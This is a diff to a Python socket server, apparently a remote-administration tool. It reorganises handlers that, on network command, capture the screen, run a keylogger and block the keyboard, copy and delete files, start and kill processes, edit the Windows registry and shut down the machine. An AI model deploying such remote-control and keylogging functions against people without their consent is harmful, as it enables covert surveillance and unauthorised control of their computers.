@@ -39,7 +39,10 @@ class Server(threading.Thread):
     def stop_socket(self):
         for client in self.clients:
             if client.is_alive():
-                client.stop()
+                try:
+                    client.stop()
+                except:
+                    pass
 
         self.socket.close()
         self.add_client_thread.join()
@@ -48,23 +51,21 @@ class Server(threading.Thread):
         try:
             self.start_socket()
         except:
-            self.ui_cmd("err", "cannot start")
-            self.ui_cmd("start")
+            self.ui_cmd("start", "err")
         else:
-            self.ui_cmd("stop")
+            self.ui_cmd("start", "ok")
 
     def task_stop(self):
         try:
             self.stop_socket()
         except:
-            DEBUG("ERR when stop socket")
+            pass
         finally:
-            self.ui_cmd("start")
+            self.ui_cmd("stop")
 
     def run(self):
         while True:
             task = self.socket_queue.get()
-            DEBUG("task", task)
 
             cmd, ext = task
             if cmd == "exit":
@@ -73,6 +74,7 @@ class Server(threading.Thread):
                 self.task_start()
             elif cmd == "stop":    
                 self.task_stop()
+
 
 
 class add_client(threading.Thread):
@@ -114,16 +116,28 @@ class Client(Socket, threading.Thread):
             DEBUG("ERR when stop", self.name)
         finally:
             DEBUG("remove client", self.name)
-    
+
+    def task_get_MAC(self):
+        self.send_str(utils.get_MAC())
+
+    def task_shutdown(self):
+        utils.shutdown()
+
+    def task_logout(self):
+        utils.logout()
+
+    def task_restart(self):
+        utils.restart()
+
+    # screen
     def task_screen_stream(self):
         size = self.recv_obj()
         self.send_obj(utils.take_screenshot(size))
-        DEBUG("sent screenshot")
 
     def task_screen_capture(self):
         self.send_obj(utils.take_screenshot())
-        DEBUG("sent screenshot")
 
+    # keyboard
     def task_keyboard_start(self):
         self.listener = keyboard.Keylogger()
         self.listener.start()
@@ -157,6 +171,7 @@ class Client(Socket, threading.Thread):
         if self.listener is not None:
             self.listener.unblock_keyboard()
 
+    # file
     def task_get_dir(self):
         dir = self.recv_str()
 
@@ -170,73 +185,23 @@ class Client(Socket, threading.Thread):
             DEBUG("Cannot open folder")
         finally:
             self.send_obj((dir, data_list))
-
-    def task_get_MAC(self):
-        self.send_str(utils.get_MAC())
-
-    def task_shutdown(self):
-        utils.shutdown()
-
-    def task_logout(self):
-        utils.logout()
-
-    def task_restart(self):
-        utils.restart()
-
-    def task_kill_process(self):
-        uid = self.recv_str()
-        self.send_state(utils.kill_process(uid))
-
-    def task_start_process(self):
-        path = self. recv_str()
-        self.send_state(utils.start_process(path))
-
-    def task_get_running_process(self):
-        self.send_obj(utils.get_running_process())
-
-    def task_get_running_app(self):
-        self.send_obj(utils.get_running_app())
-
-    def task_get_app_list(self):
-        self.send_obj(utils.get_all_app())
-
-    def task_merge_reg_file(self):
-        file_data = self.recv_str()
-        self.send_state(registry.merge_reg_file(file_data))
-
-    def task_query_reg_value(self):
+    
+    def task_delete_file(self):
         path = self.recv_str()
-        value = self.recv_str()
-        self.send_obj((value, *registry.query_value(path, value)))
-
-    def task_set_reg_value(self):
-        path = self.recv_str()
-        value = self.recv_str()
-        type = self.recv_str()
-        data = self.recv_obj()
-
-        self.send_state(registry.set_value(path, value, type, data))
-
-    def task_delete_reg_value(self):
-        path = self.recv_str()
-        value = self.recv_str()
-        self.send_state(registry.delete_value(path, value))
-
-    def task_create_reg_key(self):
-        path = self.recv_str()
-        self.send_state(registry.create_key(path))
-
-    def task_delete_reg_key(self):
-        path = self.recv_str()
-        self.send_state(registry.delete_key(path))
+        self.send_state(utils.delete_file(path))
 
     def task_copy_file(self):
         path = self.recv_str()
         self.file_handle = utils.FileSender(path)
-        if self.file_handle.open_file():
-            self.send_obj(self.file_handle.get_info())
-        else:
-            self.send_obj((None, None))
+
+        infor = (None, None)
+        try:
+            if self.file_handle.open_file():
+                infor = self.file_handle.get_info()
+        except:
+            self.file_handle = None
+        finally:
+            self.send_obj(infor)
 
     def task_continue_copy_file(self):
         length = int(self.recv_str())
@@ -253,10 +218,56 @@ class Client(Socket, threading.Thread):
         except:
             pass
 
-    def task_delete_file(self):
-        path = self.recv_str()
-        self.send_state(utils.delete_file(path))
+    # app
+    def task_get_running_app(self):
+        self.send_obj(utils.get_running_app())
 
+    def task_get_app_list(self):
+        self.send_obj(utils.get_all_app())
+
+    # process
+    def task_kill_process(self):
+        uid = self.recv_str()
+        self.send_state(utils.kill_process(uid))
+
+    def task_start_process(self):
+        path = self. recv_str()
+        self.send_state(utils.start_process(path))
+
+    def task_get_running_process(self):
+        self.send_obj(utils.get_running_process())
+
+    # registry
+    def task_merge_reg_file(self):
+        file_data = self.recv_str()
+        self.send_state(registry.merge_reg_file(file_data))
+
+    def task_query_reg_value(self):
+        path = self.recv_str()
+        value = self.recv_str()
+        self.send_obj((value, *registry.query_value(path, value)))
+
+    def task_set_reg_value(self):
+        path = self.recv_str()
+        value = self.recv_str()
+        type = self.recv_str()
+        data = self.recv_obj()
+        self.send_state(registry.set_value(path, value, type, data))
+
+    def task_delete_reg_value(self):
+        path = self.recv_str()
+        value = self.recv_str()
+        self.send_state(registry.delete_value(path, value))
+
+    def task_create_reg_key(self):
+        path = self.recv_str()
+        self.send_state(registry.create_key(path))
+
+    def task_delete_reg_key(self):
+        path = self.recv_str()
+        self.send_state(registry.delete_key(path))
+
+    
     def run(self):
         while True:
             flag = self.recv_str()
@@ -265,10 +276,22 @@ class Client(Socket, threading.Thread):
             if flag == 'close':
                 self.stop()
                 break
+            elif flag == 'get-MAC':
+                self.task_get_MAC()
+            elif flag == 'shutdown':
+                self.task_shutdown()
+            elif flag == 'logout':
+                self.task_logout()
+            elif flag == 'restart':
+                self.task_restart()
+
+            # screen
             elif flag == 'screen-stream':
                 self.task_screen_stream()
             elif flag == 'screen-capture':
                 self.task_screen_capture()
+            
+            # keyboard
             elif flag == 'listener-start':
                 self.task_keyboard_start()
             elif flag == 'listener-stop':
@@ -285,26 +308,34 @@ class Client(Socket, threading.Thread):
                 self.task_keyboard_block()
             elif flag == 'listener-unblock':
                 self.task_keyboard_unblock()
+            
+            # file
             elif flag == 'get-dir':
                 self.task_get_dir()
-            elif flag == 'get-MAC':
-                self.task_get_MAC()
-            elif flag == 'shutdown':
-                self.task_shutdown()
-            elif flag == 'logout':
-                self.task_logout()
-            elif flag == 'restart':
-                self.task_restart()
+            elif flag == 'delete-file':
+                self.task_delete_file()    
+            elif flag == 'copy-file':
+                self.task_copy_file()
+            elif flag == 'continue-copy-file':
+                self.task_continue_copy_file()
+            elif flag == 'close-file':
+                self.task_close_file()
+
+            # app
+            elif flag == 'get-running-app':
+                self.task_get_running_app()
+            elif flag == 'get-app-list':
+                self.task_get_app_list()
+            
+            # process   
             elif flag == 'kill-process':
                 self.task_kill_process()
             elif flag == 'start-process':
                 self.task_start_process()
             elif flag == 'get-running-process':
                 self.task_get_running_process()
-            elif flag == 'get-running-app':
-                self.task_get_running_app()
-            elif flag == 'get-app-list':
-                self.task_get_app_list()
+            
+            # registry
             elif flag == 'merge-reg-file':
                 self.task_merge_reg_file()
             elif flag == 'query-reg-value':
@@ -317,15 +348,7 @@ class Client(Socket, threading.Thread):
                 self.task_create_reg_key()
             elif flag == 'delete-reg-key':
                 self.task_delete_reg_key()
-            elif flag == 'copy-file':
-                self.task_copy_file()
-            elif flag == 'continue-copy-file':
-                self.task_continue_copy_file()
-            elif flag == 'close-file':
-                self.task_close_file()
-            elif flag == 'delete-file':
-                self.task_delete_file()
-
+            
             else:
                 DEBUG("unknown flag", flag)
     
